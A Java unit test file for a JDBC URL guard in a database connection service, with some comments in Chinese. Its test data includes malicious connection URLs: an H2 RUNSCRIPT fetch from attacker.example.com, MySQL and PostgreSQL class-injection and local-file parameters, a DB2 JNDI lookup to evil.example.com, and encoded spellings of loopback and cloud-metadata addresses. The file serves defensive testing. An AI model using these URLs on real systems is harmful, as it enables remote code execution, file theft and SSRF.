/*
 * Copyright 2024-2026 Embabel Pty Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.entropy.database.mcp.byok;

import com.entropy.database.mcp.properties.ByokProperties;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Policy-level tests for the JDBC URL guard that {@code DynamicDataSourceManagerImpl} applies to every
 * connection registration. Enforcement through the manager is covered by
 * {@link DynamicDataSourceManagerImplTest}.
 */
class ByokUrlGuardTest {

    private static final ByokProperties.UrlGuard DEFAULTS = ByokProperties.UrlGuard.defaults();

    // ─── defaults: driver and host wide open ────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:oracle:thin:@//oracle.example.com:1521/ORCLPDB1",
            "jdbc:mysql://mysql.example.com:3306/app?useSSL=true&serverTimezone=UTC",
            "jdbc:postgresql://pg.example.com:5432/app?ssl=true&stringtype=unspecified",
            "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1",
            "jdbc:sqlserver://mssql.example.com:1433;databaseName=app;encrypt=true",
            "jdbc:postgresql://10.0.0.5:5432/app"})
    void allowsOrdinaryUrlsIncludingPrivateHosts(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void allowsEveryDriverByDefault() {
        assertThat(DEFAULTS.allowedDrivers()).isEmpty();
        assertThat(DEFAULTS.findViolation("jdbc:exotic://host/db")).isNull();
    }

    @Test
    void allowsEveryHostByDefault() {
        assertThat(DEFAULTS.blockedHosts()).isEmpty();
        assertThat(DEFAULTS.blockPrivateNetworks()).isFalse();
        assertThat(DEFAULTS.findViolation("jdbc:postgresql://127.0.0.1:5432/db")).isNull();
    }

    @Test
    void rejectsDangerousParametersByDefault() {
        assertThat(DEFAULTS.rejectDangerousUrlParameters()).isTrue();
    }

    @Test
    void nullAndBlankValuesFallBackToTheDefaults() {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(null, null, null, null);

        assertThat(guard.allowedDrivers()).isEmpty();
        assertThat(guard.blockedHosts()).isEmpty();
        assertThat(guard.blockPrivateNetworks()).isFalse();
        assertThat(guard.rejectDangerousUrlParameters()).isTrue();
    }

    @Test
    void byokPropertiesWithoutUrlGuardStillRejectsDangerousParameters() {
        ByokProperties properties = new ByokProperties(
                java.time.Duration.ofMinutes(30), java.time.Duration.ofHours(2),
                java.time.Duration.ofMinutes(5), 100, 10, 2);

        assertThat(properties.urlGuard()).isNotNull();
        assertThat(properties.urlGuard().findViolation("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://x/y.sql'"))
                .isNotNull();
    }

    // ─── dangerous URL parameters ───────────────────────────────────────────

    @Test
    void rejectsH2InitRunscript() {
        String violation = DEFAULTS.findViolation(
                "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/x.sql'");

        assertThat(violation).contains("init");
        assertThat(violation).doesNotContain("attacker.example.com");
    }

    @Test
    void rejectsRunscriptSmuggledIntoAnotherParameter() {
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;MODE=MySQL;X=runscript from 'http://x/y.sql'"))
                .contains("runscript");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:mysql://evil.example.com/db?allowLoadLocalInfile=true",
            "jdbc:mysql://evil.example.com/db?useSSL=false&allowUrlInLocalInfile=true",
            "jdbc:mysql://evil.example.com/db?autoDeserialize=true",
            "jdbc:mysql://evil.example.com/db?socketFactory=com.evil.Factory",
            "jdbc:mysql://evil.example.com/db?queryInterceptors=com.evil.Interceptor",
            "jdbc:mysql://evil.example.com/db?statementInterceptors=com.evil.Interceptor",
            "jdbc:mysql://evil.example.com/db?detectCustomCollations=true",
            "jdbc:mysql://evil.example.com/db?allowMultiQueries=true",
            "jdbc:mysql://evil.example.com/db?useLocalInfile=true"})
    void rejectsMySqlFileAndClassLoadingParameters(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNotNull();
    }

    @Test
    void namesTheRejectedParameterButNeverEchoesTheUrl() {
        String violation = DEFAULTS.findViolation(
                "jdbc:mysql://evil.example.com/db?user=root&password=s3cr3t&allowLoadLocalInfile=true");

        assertThat(violation).contains("allowloadlocalinfile");
        assertThat(violation).doesNotContain("s3cr3t");
        assertThat(violation).doesNotContain("jdbc:mysql://");
    }

    @Test
    void parameterMatchingIsCaseInsensitiveAndSeparatorAgnostic() {
        // ';' separated (H2 / SQL Server style) and '?'/'&' separated (MySQL / PG style)
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;init=create table t(id int)")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;InIt=create table t(id int)")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?ALLOWLOADLOCALINFILE=true")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?x=1&AllowUrlInLocalInfile=true")).isNotNull();
    }

    @Test
    void allowsH2HardeningParameters() {
        // FORBID_CREATION is a hardening switch, not an attack vector, so it must stay usable.
        assertThat(DEFAULTS.findViolation("jdbc:h2:./data/app;FORBID_CREATION=FALSE")).isNull();
        assertThat(DEFAULTS.findViolation("jdbc:h2:./data/app;FORBID_CREATION=TRUE;MODE=Oracle")).isNull();
    }

    @Test
    void dangerousParametersPassWhenTheGuardIsExplicitlyDisabled() {
        ByokProperties.UrlGuard permissive = new ByokProperties.UrlGuard(List.of(), List.of(), false, false);

        assertThat(permissive.findViolation("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://x/y.sql'")).isNull();
    }

    // ─── opt-in driver / host policy ────────────────────────────────────────

    @Test
    void allowedDriversRejectsEverythingElseWhenConfigured() {
        ByokProperties.UrlGuard guard =
                new ByokProperties.UrlGuard(List.of("Oracle", "postgresql"), List.of(), false, true);

        assertThat(guard.findViolation("jdbc:oracle:thin:@//host:1521/svc")).isNull();
        assertThat(guard.findViolation("jdbc:postgresql://host:5432/db")).isNull();
        assertThat(guard.findViolation("jdbc:h2:mem:x")).contains("h2");
    }

    @Test
    void blockedHostsMatchesExactlyAndBySuffix() {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(
                List.of(), List.of("metadata.example.com", ".internal", "*.corp"), false, true);

        assertThat(guard.findViolation("jdbc:postgresql://metadata.example.com:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.internal:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.corp:5432/db")).isNotNull();
        assertThat(guard.findViolation("jdbc:postgresql://db.example.com:5432/db")).isNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://127.0.0.1:5432/db",
            "jdbc:postgresql://localhost:5432/db",
            "jdbc:postgresql://10.0.0.5:5432/db",
            "jdbc:postgresql://172.16.3.4:5432/db",
            "jdbc:postgresql://192.168.1.1:5432/db",
            "jdbc:postgresql://169.254.169.254:5432/db",
            "jdbc:oracle:thin:@//10.1.2.3:1521/svc"})
    void blockPrivateNetworksRejectsPrivateLiterals(String jdbcUrl) {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(List.of(), List.of(), true, true);

        assertThat(guard.findViolation(jdbcUrl)).isNotNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://db.example.com:5432/db",
            "jdbc:postgresql://8.8.8.8:5432/db",
            "jdbc:postgresql://172.32.0.1:5432/db",
            "jdbc:h2:mem:testdb"})
    void blockPrivateNetworksLeavesPublicAndHostlessUrlsAlone(String jdbcUrl) {
        ByokProperties.UrlGuard guard = new ByokProperties.UrlGuard(List.of(), List.of(), true, true);

        assertThat(guard.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void blankUrlIsNotTheGuardsProblem() {
        // Emptiness is rejected by ConnectionProperties itself; the guard must not mask that error.
        assertThat(DEFAULTS.findViolation(null)).isNull();
        assertThat(DEFAULTS.findViolation("   ")).isNull();
    }

    // ─── 驱动的「类名参数」入口 ─────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            // PostgreSQL：CVE-2022-21724 一族，全部是由 URL 指定、由驱动实例化的类名
            "jdbc:postgresql://h/db?sslfactory=org.evil.Factory",
            "jdbc:postgresql://h/db?sslhostnameverifier=org.evil.Verifier",
            "jdbc:postgresql://h/db?sslpasswordcallback=org.evil.Callback",
            "jdbc:postgresql://h/db?authenticationPluginClassName=org.evil.Plugin",
            "jdbc:postgresql://h/db?xmlFactoryFactory=org.evil.Xml",
            "jdbc:postgresql://h/db?socketFactoryArg=/etc/passwd",
            // loggerFile 是任意文件写入
            "jdbc:postgresql://h/db?loggerFile=/tmp/evil.jsp",
            // MySQL 的其余类名参数
            "jdbc:mysql://h/db?propertiesTransform=com.evil.Transform",
            "jdbc:mysql://h/db?connectionLifecycleInterceptors=com.evil.Interceptor",
            "jdbc:mysql://h/db?exceptionInterceptors=com.evil.Interceptor",
            "jdbc:mysql://h/db?authenticationPlugins=com.evil.Plugin",
            "jdbc:mysql://h/db?defaultAuthenticationPlugin=com.evil.Plugin",
            "jdbc:mysql://h/db?clientInfoProvider=com.evil.Provider",
            "jdbc:mysql://h/db?serverConfigCacheFactory=com.evil.Factory",
            // DB2：JNDI 查找。第一个属性用 ':' 而不是 ';' 分隔，所以它落在地址段里
            "jdbc:db2://h:50000/db:clientRerouteServerListJNDIName=ldap://evil.example.com/x;"})
    void rejectsDriverClassInstantiationParameters(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNotNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            // 名字以 factory/interceptor(s)/plugin(s)/provider/transform 结尾：兜底规则，
            // 免得每来一个新驱动参数都要追黑名单
            "jdbc:postgresql://h/db?futureSocketFactory=x",
            "jdbc:mysql://h/db?myQueryInterceptors=x",
            "jdbc:mysql://h/db?tenantProvider=x",
            "jdbc:mysql://h/db?configTransform=x",
            "jdbc:mysql://h/db?exoticAuthPlugin=x",
            // 值形似全限定类名
            "jdbc:mysql://h/db?someNewOption=com.evil.Payload"})
    void rejectsUnknownClassEntryPointsByNamingConvention(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNotNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://pg.example.com:5432/db?sslmode=require",
            "jdbc:mysql://mysql.example.com/db?serverTimezone=UTC&characterEncoding=utf8",
            "jdbc:mysql://mysql.example.com/db?connectionTimeZone=Asia/Shanghai",
            "jdbc:postgresql://pg.example.com/db?ApplicationName=reporting&currentSchema=public",
            "jdbc:sqlserver://mssql.example.com:1433;databaseName=app;encrypt=true;trustServerCertificate=false",
            "jdbc:oracle:thin:@(description=(address=(protocol=tcp)(host=oracle.example.com)(port=1521)))"})
    void ordinaryParametersAreNotCaughtByTheHeuristics(String jdbcUrl) {
        assertThat(DEFAULTS.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void percentEncodingCannotBypassTheParameterBlacklist() {
        // 驱动解码后看到的是 init / allowLoadLocalInfile，所以只匹配原文是不够的
        assertThat(DEFAULTS.findViolation("jdbc:h2:mem:x;%69nit=create table t(id int)")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?%61llowLoadLocalInfile=true")).isNotNull();
        assertThat(DEFAULTS.findViolation("jdbc:mysql://h/db?SOCKETfactory=com.evil.Factory")).isNotNull();
    }

    // ─── host 解析：等价写法不能绕过 host 策略 ──────────────────────────────

    private static final ByokProperties.UrlGuard BLOCK_PRIVATE =
            new ByokProperties.UrlGuard(List.of(), List.of(), true, true);

    private static final ByokProperties.UrlGuard BLOCK_METADATA =
            new ByokProperties.UrlGuard(List.of(), List.of("169.254.169.254"), false, true);

    @ParameterizedTest
    @ValueSource(strings = {
            // userinfo 里的用户名曾被当成 host（host='app'）
            "jdbc:mysql://app:pw@127.0.0.1:3306/db",
            "jdbc:mysql://app@127.0.0.1:3306/db",
            // 多主机写法曾只校验第一个
            "jdbc:mysql://good.example.com,169.254.169.254/db",
            "jdbc:mysql://good.example.com,127.0.0.1:3306/db",
            "jdbc:mysql://address=(host=169.254.169.254)(port=3306)/db",
            // IPv6 字面量曾被截成 '['
            "jdbc:postgresql://[::1]:5432/db",
            "jdbc:postgresql://[fe80::1]:5432/db",
            "jdbc:postgresql://[::ffff:127.0.0.1]:5432/db",
            // inet_aton 接受的短写 / 纯数字 / 十六进制形式，驱动都会解析成 127.0.0.1
            "jdbc:postgresql://127.1/db",
            "jdbc:postgresql://2130706433/db",
            "jdbc:postgresql://0x7f.0.0.1/db",
            "jdbc:postgresql://0177.0.0.1/db",
            // 尾点是合法的 FQDN 写法，解析结果与 localhost 相同
            "jdbc:postgresql://localhost./db"})
    void blockPrivateNetworksSeesThroughEquivalentHostSpellings(String jdbcUrl) {
        assertThat(BLOCK_PRIVATE.findViolation(jdbcUrl)).isNotNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:mysql://app:pw@db.example.com:3306/db",
            "jdbc:postgresql://8.8.8.8:5432/db",
            "jdbc:postgresql://[2001:db8::1]:5432/db",
            "jdbc:mysql://mysql-1.example.com,mysql-2.example.com/db",
            "jdbc:sqlserver://mssql.example.com\\INST:1433;databaseName=app",
            "jdbc:h2:mem:testdb"})
    void blockPrivateNetworksStillAllowsPublicHosts(String jdbcUrl) {
        assertThat(BLOCK_PRIVATE.findViolation(jdbcUrl)).isNull();
    }

    @Test
    void blockedHostsCatchesTheSameEquivalentSpellings() {
        // 云元数据地址是 blocked-hosts 的主要目标，所有等价写法都必须命中
        assertThat(BLOCK_METADATA.findViolation("jdbc:mysql://good.example.com,169.254.169.254/db")).isNotNull();
        assertThat(BLOCK_METADATA.findViolation("jdbc:mysql://app:pw@169.254.169.254:3306/db")).isNotNull();
        assertThat(BLOCK_METADATA.findViolation("jdbc:postgresql://2852039166/db")).isNotNull();
        assertThat(BLOCK_METADATA.findViolation("jdbc:postgresql://169.254.169.254./db")).isNotNull();
        assertThat(BLOCK_METADATA.findViolation("jdbc:postgresql://db.example.com:5432/db")).isNull();
    }

    @Test
    void hostPolicyIgnoresAddressesThatOnlyAppearInsideParameterValues() {
        // 参数值里的 URL 不是连接目标；把它当成 host 会在关掉参数守卫时误报，也会把密码带进错误信息
        ByokProperties.UrlGuard guard =
                new ByokProperties.UrlGuard(List.of(), List.of("attacker.example.com"), false, false);

        assertThat(guard.findViolation("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/x.sql'"))
                .isNull();
    }

    @Test
    void defaultsStillLeaveDriverAndHostWideOpenAfterTheHostParsingFix() {
        // 默认值是用户明确要求的：allowed-drivers 空、blocked-hosts 空、block-private-networks false
        assertThat(DEFAULTS.findViolation("jdbc:mysql://app:pw@127.0.0.1:3306/db")).isNull();
        assertThat(DEFAULTS.findViolation("jdbc:postgresql://[::1]:5432/db")).isNull();
        assertThat(DEFAULTS.findViolation("jdbc:postgresql://2130706433/db")).isNull();
    }
}
